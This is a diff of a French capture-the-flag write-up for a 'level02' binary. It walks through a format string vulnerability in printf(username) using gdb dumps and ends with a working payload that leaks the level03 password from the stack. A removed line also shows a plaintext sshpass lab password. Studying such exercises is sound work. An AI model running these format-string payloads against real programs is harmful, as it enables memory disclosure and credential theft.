@@ -42,7 +42,7 @@ On peut réécrire en C un code source :
 int main(int argc, const char **argv)
 {
 	char *password[96];		 // rbp-0x110
-	char *password_file[40]; // rbp-0xa0 0x 7f ff ff ff e5 40
+	char *password_file[40]; // rbp-0xa0
 	char *username[96];		 // rbp-0x70
 	int tmp;				 // rbp-0xc
 	FILE *file;				 // rbp-0x8
@@ -151,24 +151,64 @@ printf(username);
 
 On peut donc utiliser une **format string attack**.
 
-Comme le mot de passe est lu et est stocké dans une variable, il faudrait juste pouvoir afficher cette variable pour obtenir notre mot de passe.
+Comme le mot de passe est lu et stocké dans une variable, il faudrait juste pouvoir afficher cette variable pour obtenir notre mot de passe.
 
-#
-
-En affichant sur la sortie la mémoire, le 1er argument "7fffffffe500" correspond au mot de passe.
-Il est normalement stocké à l'adresse "7fffffffe4d0".
-On devine que lors du printf 7fffffffe500 - 7fffffffe4d0 octets ont été push sur la stack soit 30 (hex) = 48 octets.
-
-L'adresse du mot de passe est 7fffffffe540, en lui ajoutant 30(hex) on trouve l'adresse 0x7fffffffe570.
-
-En l'écrivant dans le 2e argument et en affichant le 8e element on obtient le mot de passe.
-
-### Commandes
+En utilisant la commande :
 
 ```bash
-make && ./generator  && sshpass -p 'PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv' scp -P 4242 -r args level02@localhost:/tmp/
+(echo "%lx %lx %lx %lx %lx %lx %lx %lx %lx"; echo "passwd") | ./level02
 ```
 
+on obtient :
+
+```
+7fffffffe3d0 0 70 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe5c8 1f7ff9a08 647773736170 0 does not have access!
+```
+
+Avec gdb, en s'arrêtant juste avant l'appel à la fonction _printf_, on peut voir le contenu des registres :
+
+```
+RAX: 0x0
+RBX: 0x0
+RCX: 0x70 ('p')
+RDX: 0x0
+RSI: 0x7fffffffe390 --> 0x647773736170 ('passwd')
+RDI: 0x7fffffffe430 --> 0x786c25 ('%lx')
+RBP: 0x7fffffffe4a0 --> 0x0
+RSP: 0x7fffffffe380 --> 0x7fffffffe588 --> 0x7fffffffe7ef ("/home/users/level02/level02")
+RIP: 0x400aa2 (<main+654>:      call   0x4006c0 <printf@plt>)
+R8 : 0x2a2a2a2a2a2a2a2a ('********')
+R9 : 0x2a2a2a2a2a2a2a2a ('********')
+R10: 0x7fffffffe110 --> 0x0
+```
+
+et de la stack :
+
+```
+0000| 0x7fffffffe380 --> 0x7fffffffe588 --> 0x7fffffffe7ef ("/home/users/level02/level02")
+0008| 0x7fffffffe388 --> 0x1f7ff9a08
+0016| 0x7fffffffe390 --> 0x647773736170 ('passwd')
+0024| 0x7fffffffe398 --> 0x0
+```
+
+On remarque bien la correspondance entre les paramètres et les registres / la stack. Les adresses `7fffffffe3d0 0 70 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a` correspondent respectivement aux registres `RSI RDX RCX R8 R9`. Les adresses `7fffffffe5c8 1f7ff9a08 647773736170 0` correspondent aux premiers éléments de la stack.
+
+On remarque donc que notre mot de passe est dans la stack et donc qu'on peut le réutiliser. On le vérifie :
+
 ```bash
-(cat /tmp/args/arg1 ; cat /tmp/args/arg2 ) | ./level02
+(echo "%s %lx %lx %lx %lx %lx %lx %lx %lx"; echo "AAAAAAAAA") | ./level02
+```
+
+```
+AAAAAAAAA 0 41 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe5c8 1f7ff9a08 4141414141414141 41 does not have access!
+```
+
+On peut donc insérer l'adresse de la variable où est stocké le mot de passe du level03 et l'afficher. L'adresse de cette variable est `0x7fffffffe400`. Cependant on a vu précédement que l'adresse du mot de passe entré par l'utilisateur est différente selon si on exécute le binaire via le débugueur ou non.
+On avait dans le débugueur l'adresse `0x7fffffffe390` et l'adresse affichée `0x7fffffffe3d0`. En faisant la différence des deux on obtient 0x40 (hex) ou 64 (dec).
+En ajoutant cette différence à notre adressse on obtient `0x7fffffffe400 + 0x40 = 0x7f ffffffe440`.
+
+Finalement on peut utiliser la commande suivante pour afficher le mot de passe de l'utilisateur level03 :
+
+```bash
+(echo "%lx %lx %lx %lx %lx %lx %lx %s %lx"; echo -e "\x40\xe4\xff\xff\xff\x7f") | ./level02
 ```
